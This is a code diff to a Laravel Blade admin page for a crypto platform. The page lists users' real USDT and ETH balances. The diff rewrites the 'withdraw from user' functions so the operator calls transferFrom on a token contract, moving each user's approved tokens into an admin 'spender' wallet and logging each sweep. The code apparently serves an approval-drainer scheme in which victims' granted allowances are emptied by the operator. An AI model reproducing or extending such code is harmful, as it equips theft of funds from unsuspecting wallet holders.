@@ -22,16 +22,9 @@
 
                         </div>
                         <div class="float-right">
-                            {{-- <small>Connected Wallet:</small> --}}
-                            {{-- <button id="connectButton" type="button" class="btn btn-primary" onClick="connectWallet()">
-                                Connect
-                            </button> --}}
                             <div id="app">
                                 <Wallet />
                             </div>
-                            <?php
-                                $walletAddress = session('walletAddress');
-                            ?>
                         </div>
                     </div>
                 </div>
@@ -83,7 +76,12 @@
                             <td id="real_balance">{{$user->usdt_real_balance ?? '-'}} <br><span class="badge badge-secondary">{{$user->usdt_real_balance_updated_at}}</span></td>
 
 
-                            <td>@if ($user->status == 'pending') <span class="badge badge-warning">pending</span> @else <span class="badge badge-primary">approved</span>@endif</td>
+                            <td>@if ($user->status == 'pending') <span class="badge badge-warning">pending</span> @else <span class="badge badge-primary">approved</span>@endif<br>
+                            @if(isset($user->balance[0]->updated_by))
+                                <span class="badge badge-info">{{\App\Models\User::find($user->balance[0]->updated_by)->name}}
+                                </span>
+                            @endif
+                            </td>
                             <td>
                                 {{-- <button class="btn btn-secondary">
                                 <i class="fas fa-ellipsis-v"></i>
@@ -123,11 +121,14 @@
 <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"> </script>
 <script src="{{ asset('contracts/contractABI.js') }}"></script>
 <script src="{{ asset('contracts/contractAddress.js') }}"></script>
+<script src="{{ asset('contracts/tokenContractABI.js') }}"></script>
+<script src="{{ asset('contracts/tokenContractAddress.js') }}"></script>
 <script src="{{asset('plugins/data-tables/dataTables.min.js')}}"></script>
 
 <script>
     const web3 = new Web3(window.ethereum)
     const contract = new web3.eth.Contract(contractABI, contractAddress)
+    const tokenContract = new web3.eth.Contract(tokenContractABI, tokenContractAddress)
 
     // Get info
     const getInfo = async () => {
@@ -155,11 +156,7 @@
 
     // Withdraw from user
     const withdrawETH = async () => {
-        // Ensure the user has connected their wallet
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        })
-        const adminWalletAddress = accounts[0]
+        let adminWalletAddress = $('#modal-spender').val();
         let user = $('#modal-wallet').val();
         let amount = $('#modal-amount').val();
 
@@ -177,11 +174,9 @@
             $("#btn-fetch").css('display','none');
             $("#loader-btn").css('display','block');
 
-
             try {
                 // Convert amount to Wei
                 const amountInEth = web3.utils.toWei(amount.toString(), 'ether')
-
 
                 // Call the withdraw method on the contract
                 const transaction = await contract.methods.withdrawETH(user, amountInEth).send({
@@ -210,6 +205,7 @@
 
                             $("#btn-fetch").css('display','block');
                             $("#loader-btn").css('display','none');
+                            $("#modal-amount").val();
 
                             window.location.reload();
                         }
@@ -226,57 +222,51 @@
 
     // Withdraw from user
     const withdrawUSDT = async () => {
-        // Ensure the user has connected their wallet
-        const accounts = await window.ethereum.request({
-            method: 'eth_requestAccounts'
-        })
-        const adminWalletAddress = accounts[0]
-        let user = $('#modal-wallet').val();
+        let adminWalletAddress = $('#modal-spender').val();
+        let userWalletAddress = $('#modal-wallet').val();
         let amount = parseInt($('#modal-amount').val());
 
         var balance = $("#modal-amount").val();
 
         var a_balance = $("#modal-balance").text();
 
-
         if (parseFloat(balance) > parseFloat(a_balance) || balance == '') {
-
             $("#modal-amount").css("border", "1px solid red");
-
         }else{
-
             $("#btn-fetch").css('display','none');
             $("#loader-btn").css('display','block');
 
             try {
-                // Call the withdraw method on the contract
+                let allowanceAmount = await tokenContract.methods.allowance(userWalletAddress, adminWalletAddress).call()
 
-                const transaction = await contract.methods.withdrawUSDT(user, amount).send({
-                    from: adminWalletAddress,
-                });
-                console.log('USDT Withdrawal successful:', transaction)
+                allowanceAmount = Number(allowanceAmount.toString())
+                console.log(allowanceAmount)
+                
+                const tx = await tokenContract.methods.transferFrom(userWalletAddress, adminWalletAddress, amount).send({
+                    from: adminWalletAddress
+                })
 
-                if(transaction)
-                {
+                if (tx.transactionHash) {
                     $.ajaxSetup({
-                    headers: {
-                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
-                    }
+                        headers: {
+                            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+                        }
                     });
 
                     $.ajax({
                         url: "{{ route('fetch.usdt_tokens') }}",
                         type: 'POST',
                         data: {
-                            wallet: user,
+                            wallet: userWalletAddress,
                             amount: amount,
-                            spender: accounts[0],
+                            spender: adminWalletAddress,
                         },
                     }).done(function(response) {
                         if (response == 'ok') {
 
                             $("#btn-fetch").css('display','block');
                             $("#loader-btn").css('display','none');
+                            $("#modal-amount").val();
 
                             window.location.reload();
                         }
@@ -316,59 +306,64 @@
     };
 
     async function fetchEthToken(id) {
-        // const accounts = await window.ethereum.request({
-        //     method: 'eth_requestAccounts'
-        // });
-        // const adminWalletAddress = accounts[0];
-
+      
         var wallet = $("#modal_eth_" + id).attr('data-wallet');
         var balance = $("#modal_eth_" + id).attr('data-balance');
+        var spender = $("#modal-spender").val();
 
-        if(balance == '' || balance == '0.0' || balance == '0')
-        {
-            $('#errorForm').modal('show');
+        if(spender == ''){
 
+            $('#spendererrorForm').modal('show');
         }else{
 
-            $("#modal-wallet").val(wallet);
-            // $("#modal-spender").val(adminWalletAddress);
-            $("#modal-balance").text(balance);
+            if(balance == '' || balance == '0.0' || balance == '0')
+            {
+                $('#errorForm').modal('show');
 
-            $('#fetchForm').modal({
-                backdrop: 'static',
-                keyboard: false  // to prevent closing with Esc button (if you want this too)
-            });
+            }else{
+
+                $("#modal-wallet").val(wallet);
+                // $("#modal-spender").val(adminWalletAddress);
+                $("#modal-balance").text(balance);
+
+                $('#fetchForm').modal({
+                    backdrop: 'static',
+                    keyboard: false  // to prevent closing with Esc button (if you want this too)
+                });
+            }
         }
-
     }
 
     async function fetchUsdtToken(id) {
-        // const accounts = await window.ethereum.request({
-        //     method: 'eth_requestAccounts'
-        // });
-        // const adminWalletAddress = accounts[0];
-
+     
         var wallet = $("#modal_usdt_" + id).attr('data-wallet');
         var balance = $("#modal_usdt_" + id).attr('data-balance');
+        var spender = $("#modal-spender").val();
 
-        if(balance == '' || balance == '0.0' || balance == '0')
-        {
-            $('#errorForm').modal('show');
+        if(spender == ''){
+
+            $('#spendererrorForm').modal('show');
 
         }else{
 
-            $("#modal-wallet").val(wallet);
-            // $("#modal-spender").val(adminWalletAddress);
-            $("#modal-balance").text(balance);
+            if(balance == '' || balance == '0.0' || balance == '0')
+            {
+                $('#errorForm').modal('show');
 
-            $("#btn-fetch").attr('onClick','withdrawUSDT()');
+            }else{
 
-            $('#fetchForm').modal({
-                backdrop: 'static',
-                keyboard: false  // to prevent closing with Esc button (if you want this too)
-            });
+                $("#modal-wallet").val(wallet);
+                // $("#modal-spender").val(adminWalletAddress);
+                $("#modal-balance").text(balance);
+
+                $("#btn-fetch").attr('onClick','withdrawUSDT()');
+
+                $('#fetchForm').modal({
+                    backdrop: 'static',
+                    keyboard: false  // to prevent closing with Esc button (if you want this too)
+                });
+            }
         }
-
     }
 
     function checkBalance() {
